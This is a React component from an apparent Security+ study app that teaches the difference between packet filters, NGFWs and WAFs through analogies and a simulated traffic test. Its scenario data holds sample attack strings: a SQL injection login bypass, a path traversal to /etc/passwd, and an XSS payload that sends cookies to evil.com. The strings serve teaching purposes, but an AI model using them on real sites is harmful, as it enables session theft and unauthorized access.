import React, { useState } from 'react';
import { 
  ShieldCheck, 
  ShieldAlert, 
  Layers, 
  Globe, 
  Database, 
  Terminal, 
  ArrowRight, 
  CheckCircle2, 
  XCircle, 
  Sparkles, 
  Server, 
  Laptop, 
  Zap, 
  AlertTriangle,
  Play,
  RotateCcw,
  Check,
  Eye,
  FileCode,
  Flame,
  Filter
} from 'lucide-react';
import { sounds } from '../../../utils/audio';

export const FIREWALL_TIERS = [
  {
    id: 'packet_filter',
    name: 'Stateless Packet Filter',
    layer: 'OSI Layer 3 & 4 (Network / Transport)',
    badge: 'Fastest / Low Intelligence',
    color: 'sky',
    inspects: ['Source IP', 'Destination IP', 'Protocol (TCP/UDP)', 'Port Numbers (e.g. 80, 443)'],
    blindspots: [
      'Cannot see HTTP URL paths, SQL injection, or application data.',
      'Fooled by BitTorrent or Malware hiding on allowed Port 443.',
      'No session memory (needs messy manual inbound rules for return traffic).'
    ],
    analogy: 'Airport security guard who only looks at the city stamped on your luggage tag, never opening the suitcase.',
    kenyanAnalogy: 'Matatu stage conductor who only checks if your ticket says "Thika" or "Nakuru", without checking what cargo or contraband is wrapped inside your sack.'
  },
  {
    id: 'ngfw',
    name: 'Next-Generation Firewall (NGFW)',
    layer: 'OSI Layer 7 + Deep Packet Inspection (DPI)',
    badge: 'Enterprise Standard',
    color: 'indigo',
    inspects: [
      'Full Layer 7 Application Signatures (e.g. BitTorrent vs. Salesforce)',
      'SSL/TLS Decryption & Inspection',
      'Built-in Intrusion Prevention System (IPS)',
      'Active Directory / LDAP User Identity'
    ],
    blindspots: [
      'Resource intensive (requires hardware crypto acceleration for TLS decryption).',
      'Requires trusted enterprise CA certificate installed on endpoint to inspect HTTPS without browser certificate warnings.'
    ],
    analogy: 'Airport customs agent with an X-ray scanner who opens the suitcase, reads every document, and verifies passenger fingerprint.',
    kenyanAnalogy: 'Two Rivers Mall gate security who inspect under the car with a mirror chassis wand, scan luggage through an X-ray machine, and check national IDs before allowing entry.'
  },
  {
    id: 'waf',
    name: 'Web Application Firewall (WAF)',
    layer: 'OSI Layer 7 (HTTP / HTTPS Payloads Specific)',
    badge: 'Specialized Web Defense (PCI DSS)',
    color: 'rose',
    inspects: [
      'OWASP Top 10 Web Application Attacks',
      'SQL Injection (SQLi: `\' OR \'1\'=\'1`)',
      'Cross-Site Scripting (XSS: `<script>`)',
      'Directory Path Traversal (`../../etc/passwd`)',
      'HTTP Headers, Cookies & Form Parameters'
    ],
    blindspots: [
      'Only protects Web Applications (HTTP/HTTPS)! Completely blind to non-web traffic like SSH, DNS, SMB, or generic network worms.'
    ],
    analogy: 'Specialized food and drug safety inspector testing ingredients in the airport restaurant kitchen for toxins.',
    kenyanAnalogy: 'A supermarket food safety inspector who specifically tests milk packets and bread on the shelf for poison, acid, or broken seal tampering before shoppers ingest them.'
  }
];

export const TEST_TRAFFIC_SCENARIOS = [
  {
    id: 'normal_web',
    title: '1. Legitimate Public Web Traffic',
    trafficDesc: 'Customer GET /products/shoes HTTP/1.1 on Port 443',
    port: 'TCP 443 (HTTPS)',
    payload: 'GET /products/shoes HTTP/1.1\nHost: store.corporate.com',
    threatType: 'BENIGN 🟢',
    outcomes: {
      packet_filter: { action: 'ALLOW', note: 'Allowed because Port 443 is open in ACL.' },
      ngfw: { action: 'ALLOW', note: 'Allowed: Recognized as legitimate HTTPS browsing.' },
      waf: { action: 'ALLOW', note: 'Allowed: Clean web parameters; no OWASP injection detected.' }
    }
  },
  {
    id: 'torrent_tunnel',
    title: '2. Stealth BitTorrent Tunneling over Port 443',
    trafficDesc: 'P2P File Sharing disguised as HTTPS on Port 443',
    port: 'TCP 443 (HTTPS)',
    payload: 'BitTorrent Protocol Handshake disguised over port 443 socket',
    threatType: 'MALICIOUS TUNNEL ⚠️',
    outcomes: {
      packet_filter: { action: 'ALLOW (FOOLED! ❌)', note: 'Fooled! Only checked port 443 and let unauthorized BitTorrent pass!' },
      ngfw: { action: 'BLOCK (CAUGHT! 🛡️)', note: 'Blocked! Deep Packet Inspection (DPI) identified BitTorrent application protocol.' },
      waf: { action: 'PASS (NOT WEB TRAFFIC)', note: 'Ignored: Not standard HTTP request syntax, passes through to backend.' }
    }
  },
  {
    id: 'sql_injection',
    title: '3. SQL Injection Web Attack',
    trafficDesc: 'Login bypass: `POST /login.php user=\' OR 1=1--`',
    port: 'TCP 443 (HTTPS)',
    payload: 'POST /login.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nuser=\' OR 1=1--&pass=anything',
    threatType: 'OWASP WEB ATTACK 🚨',
    outcomes: {
      packet_filter: { action: 'ALLOW (BLIND! ❌)', note: 'Blind! Packet filter only saw port 443 and allowed SQL injection through.' },
      ngfw: { action: 'ALLOW / ALERT', note: 'Allowed unless strict Layer 7 web signature IPS rules are tuned.' },
      waf: { action: 'BLOCK (CAUGHT! 🛡️)', note: 'Blocked! WAF recognized SQL syntax violation and dropped the HTTP transaction!' }
    }
  },
  {
    id: 'xss_attack',
    title: '4. Stored Cross-Site Scripting (XSS)',
    trafficDesc: 'Comment injection: `<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>`',
    port: 'TCP 443 (HTTPS)',
    payload: 'POST /comment HTTP/1.1\n\ncomment=<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
    threatType: 'OWASP WEB ATTACK 🚨',
    outcomes: {
      packet_filter: { action: 'ALLOW (BLIND! ❌)', note: 'Allowed! Blind to HTML tags inside HTTP payload.' },
      ngfw: { action: 'ALLOW (BLIND! ❌)', note: 'Allowed unless generic IPS signature flags script tag.' },
      waf: { action: 'BLOCK (CAUGHT! 🛡️)', note: 'Blocked! WAF detects active JavaScript execution pattern in form field.' }
    }
  }
];

export default function WafVsNgfwComparison() {
  const [selectedTraffic, setSelectedTraffic] = useState(TEST_TRAFFIC_SCENARIOS[0]);
  const [selectedFirewall, setSelectedFirewall] = useState('packet_filter');
  const [simulationRunning, setSimulationRunning] = useState(false);
  const [evaluatedResult, setEvaluatedResult] = useState(null);

  const handleTestTraffic = (scenario, fwId) => {
    sounds.playPop();
    setSelectedTraffic(scenario);
    const targetFw = fwId || selectedFirewall;
    setSimulationRunning(true);
    setEvaluatedResult(null);

    setTimeout(() => {
      const outcome = scenario.outcomes[targetFw];
      setEvaluatedResult(outcome);
      setSimulationRunning(false);

      if (outcome.action.includes('ALLOW') && scenario.threatType !== 'BENIGN 🟢') {
        sounds.playAlert();
      } else if (outcome.action.includes('BLOCK')) {
        sounds.playSuccess();
      } else {
        sounds.playPop();
      }
    }, 600);
  };

  return (
    <div className="space-y-8 animate-fadeIn">
      
      {/* Top Banner Card */}
      <div className="bg-white rounded-3xl p-6 sm:p-8 border-3 border-indigo-300 shadow-md space-y-3">
        <div className="flex items-center justify-between flex-wrap gap-2">
          <span className="px-3 py-1 bg-indigo-100 text-indigo-950 font-black text-xs rounded-full border border-indigo-300">
            CompTIA Security+ Domain 2.1 & 3.2 • Network Security Appliances
          </span>
          <span className="text-xs font-bold text-slate-500">
            OSI Layer 4 vs. Layer 7 Deep Inspection
          </span>
        </div>

        <h3 className="text-2xl sm:text-3xl font-black text-slate-900 tracking-tight">
          Packet Filter vs. NGFW vs. WAF: Who Catches What? 🛡️🔬
        </h3>

        <p className="text-slate-600 text-xs sm:text-base leading-relaxed font-medium">
          A common CompTIA exam trap is assuming a standard network firewall protects against all attacks. 
          Standard firewalls only check <strong>Layer 4 luggage tags</strong>. An <strong>NGFW</strong> performs <strong>Deep Packet Inspection (DPI)</strong> across all applications, while a <strong>WAF</strong> specializes strictly in dissecting <strong>Layer 7 HTTP/HTTPS web conversations</strong> (SQL Injection, XSS, CSRF).
        </p>
      </div>

      {/* The 3 Firewall Contenders Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {FIREWALL_TIERS.map((tier) => {
          const isSelected = selectedFirewall === tier.id;

          return (
            <button
              key={tier.id}
              onClick={() => {
                sounds.playPop();
                setSelectedFirewall(tier.id);
                setEvaluatedResult(null);
              }}
              className={`p-5 rounded-3xl border-3 text-left transition-all space-y-3 flex flex-col justify-between cursor-pointer ${
                isSelected
                  ? 'bg-slate-900 border-indigo-500 text-white ring-4 ring-indigo-500/30 shadow-xl scale-102'
                  : 'bg-white border-slate-200 hover:border-slate-300 text-slate-800'
              }`}
            >
              <div className="space-y-1.5">
                <div className="flex items-center justify-between">
                  <span className={`text-[10px] font-mono font-black uppercase px-2 py-0.5 rounded-full ${
                    isSelected ? 'bg-indigo-500 text-white' : 'bg-slate-100 text-slate-600'
                  }`}>
                    {tier.layer}
                  </span>
                  <span className={`text-[9px] font-black uppercase px-2 py-0.5 rounded-full ${
                    tier.id === 'packet_filter' ? 'bg-sky-100 text-sky-800' :
                    tier.id === 'ngfw' ? 'bg-indigo-100 text-indigo-900' :
                    'bg-rose-100 text-rose-900'
                  }`}>
                    {tier.badge}
                  </span>
                </div>

                <h4 className={`text-base font-black ${isSelected ? 'text-white' : 'text-slate-900'}`}>
                  {tier.name}
                </h4>

                <p className={`text-xs leading-relaxed italic ${isSelected ? 'text-slate-300' : 'text-slate-600'}`}>
                  "{tier.analogy}"
                </p>

                {tier.kenyanAnalogy && (
                  <div className={`p-2.5 rounded-xl text-[11px] leading-relaxed border ${
                    isSelected ? 'bg-amber-950/40 border-amber-400/30 text-amber-200' : 'bg-amber-50 border-amber-200 text-amber-950'
                  }`}>
                    <strong className="block text-[10px] font-black uppercase text-amber-600">🇰🇪 Nairobi Street Analogy:</strong>
                    <span className="italic">{tier.kenyanAnalogy}</span>
                  </div>
                )}
              </div>

              {/* Inspects checklist */}
              <div className="space-y-2 pt-2 border-t border-slate-200/40 text-xs">
                <div>
                  <span className={`text-[10px] font-black uppercase block ${isSelected ? 'text-emerald-400' : 'text-emerald-700'}`}>
                    ✓ What It Inspects:
                  </span>
                  <ul className={`text-[11px] list-disc list-inside space-y-0.5 ${isSelected ? 'text-slate-300' : 'text-slate-600'}`}>
                    {tier.inspects.map((item, i) => (
                      <li key={i}>{item}</li>
                    ))}
                  </ul>
                </div>

                <div>
                  <span className={`text-[10px] font-black uppercase block ${isSelected ? 'text-rose-400' : 'text-rose-700'}`}>
                    ⚠️ Critical Blindspot:
                  </span>
                  <ul className={`text-[11px] list-disc list-inside space-y-0.5 ${isSelected ? 'text-slate-400' : 'text-slate-500'}`}>
                    {tier.blindspots.map((item, i) => (
                      <li key={i}>{item}</li>
                    ))}
                  </ul>
                </div>
              </div>
            </button>
          );
        })}
      </div>

      {/* LIVE TRAFFIC FIRING RANGE ARENA */}
      <div className="bg-slate-950 rounded-3xl p-6 sm:p-8 border-3 border-indigo-500 shadow-xl space-y-6">
        
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div>
            <span className="text-xs font-black uppercase text-indigo-400 tracking-wider flex items-center gap-1.5">
              <Zap className="w-4 h-4" />
              <span>Live Traffic Test Arena: Fire Packets into the Gate</span>
            </span>
            <h4 className="text-xl font-black text-white">
              Observe Which Firewall Catches vs. Is Fooled by Attack Payloads
            </h4>
          </div>

          <div className="flex items-center gap-2">
            <span className="text-xs font-mono text-slate-400">
              Active Inspector: <strong className="text-indigo-300 uppercase">{selectedFirewall.replace('_', ' ')}</strong>
            </span>
          </div>
        </div>

        {/* Traffic Scenario Selector Pills */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
          {TEST_TRAFFIC_SCENARIOS.map((scenario) => {
            const isSelected = selectedTraffic.id === scenario.id;

            return (
              <button
                key={scenario.id}
                onClick={() => handleTestTraffic(scenario)}
                className={`p-3 rounded-2xl border text-left transition-all space-y-1 cursor-pointer ${
                  isSelected
                    ? 'bg-indigo-900/80 border-indigo-400 text-white ring-2 ring-indigo-400 shadow-md scale-102'
                    : 'bg-slate-900 border-slate-800 text-slate-300 hover:border-slate-700'
                }`}
              >
                <span className={`text-[9px] font-black uppercase px-2 py-0.5 rounded-full block w-fit ${
                  scenario.threatType.includes('BENIGN') ? 'bg-emerald-950 text-emerald-300 border border-emerald-700' :
                  'bg-rose-950 text-rose-300 border border-rose-700'
                }`}>
                  {scenario.threatType}
                </span>

                <div className="text-xs font-black text-white">{scenario.title}</div>
                <div className="text-[10px] font-mono text-slate-400 truncate">{scenario.port}</div>
              </button>
            );
          })}
        </div>

        {/* Live Packet Flow Visualization & Inspector */}
        <div className="bg-slate-900 rounded-2xl p-5 border border-slate-800 space-y-4">
          
          <div className="flex items-center justify-between flex-wrap gap-2 text-xs">
            <span className="font-bold text-slate-300">
              Testing Scenario: <strong className="text-white">{selectedTraffic.title}</strong>
            </span>
            <button
              onClick={() => handleTestTraffic(selectedTraffic)}
              disabled={simulationRunning}
              className="px-4 py-1.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-black text-xs transition-all active:scale-95 flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              <span>{simulationRunning ? 'Inspecting...' : 'Fire Packet at Firewall ⚡'}</span>
            </button>
          </div>

          {/* Raw Payload Preview */}
          <div className="bg-slate-950 rounded-xl p-3 border border-slate-800 font-mono text-xs text-slate-300 space-y-1">
            <span className="text-[10px] font-black uppercase text-slate-500 block">Wire Payload Preview:</span>
            <pre className="text-amber-300 text-[11px] whitespace-pre-wrap leading-relaxed">
              {selectedTraffic.payload}
            </pre>
          </div>

          {/* Inspection Outcome Readout */}
          {evaluatedResult && (
            <div className={`p-4 rounded-2xl border-2 flex items-start gap-3 text-xs animate-fadeIn ${
              evaluatedResult.action.includes('ALLOW') && selectedTraffic.threatType !== 'BENIGN 🟢'
                ? 'bg-rose-950/70 border-rose-500 text-rose-200'
                : evaluatedResult.action.includes('BLOCK')
                ? 'bg-emerald-950/70 border-emerald-500 text-emerald-200'
                : 'bg-indigo-950/70 border-indigo-500 text-indigo-200'
            }`}>
              <div className="text-2xl mt-0.5">
                {evaluatedResult.action.includes('ALLOW') && selectedTraffic.threatType !== 'BENIGN 🟢' ? '🚨' :
                 evaluatedResult.action.includes('BLOCK') ? '🛡️' : '✅'}
              </div>

              <div className="space-y-1">
                <div className="flex items-center gap-2">
                  <span className="font-black text-sm uppercase">{evaluatedResult.action}</span>
                  <span className="text-[10px] font-mono px-2 py-0.5 bg-black/40 rounded-full">
                    {selectedFirewall.toUpperCase()} Evaluation
                  </span>
                </div>
                <p className="text-[11px] leading-relaxed font-sans">{evaluatedResult.note}</p>
              </div>
            </div>
          )}

        </div>

        {/* Matrix Comparison Table */}
        <div className="space-y-2 pt-2">
          <span className="text-xs font-black uppercase text-slate-400 tracking-wider block">
            CompTIA Security+ Core Defense Matrix (Quick Reference)
          </span>

          <div className="bg-slate-900 rounded-2xl border border-slate-800 overflow-x-auto">
            <table className="w-full text-left font-mono text-xs text-slate-300">
              <thead className="bg-slate-950 text-[10px] text-slate-400 uppercase border-b border-slate-800 font-black">
                <tr>
                  <th className="p-3">Firewall Type</th>
                  <th className="p-3">Primary OSI Layer</th>
                  <th className="p-3">Catches Port 443 Web Browsing?</th>
                  <th className="p-3">Catches Torrent / Tor Tunneling?</th>
                  <th className="p-3">Catches SQL Injection / XSS?</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60">
                <tr className="hover:bg-slate-800/50">
                  <td className="p-3 font-bold text-sky-400">Stateless Packet Filter</td>
                  <td className="p-3 text-slate-400">Layer 3 & 4 (IP / Ports)</td>
                  <td className="p-3 text-emerald-400">YES (Port check)</td>
                  <td className="p-3 text-rose-400 font-bold">NO (Fooled) ❌</td>
                  <td className="p-3 text-rose-400 font-bold">NO (Blind) ❌</td>
                </tr>
                <tr className="hover:bg-slate-800/50">
                  <td className="p-3 font-bold text-indigo-400">Next-Gen Firewall (NGFW)</td>
                  <td className="p-3 text-slate-400">Layer 7 + Deep Inspection (DPI)</td>
                  <td className="p-3 text-emerald-400">YES (App-ID)</td>
                  <td className="p-3 text-emerald-400 font-bold">YES (Identifies P2P) 🛡️</td>
                  <td className="p-3 text-amber-300">PARTIAL (Needs tuned IPS)</td>
                </tr>
                <tr className="hover:bg-slate-800/50">
                  <td className="p-3 font-bold text-rose-400">Web App Firewall (WAF)</td>
                  <td className="p-3 text-slate-400">Layer 7 (HTTP / HTTPS Only)</td>
                  <td className="p-3 text-emerald-400">YES (Web proxy)</td>
                  <td className="p-3 text-slate-500">N/A (Non-web traffic ignored)</td>
                  <td className="p-3 text-emerald-400 font-bold">YES (OWASP Specialist) 🛡️</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

      </div>

    </div>
  );
}
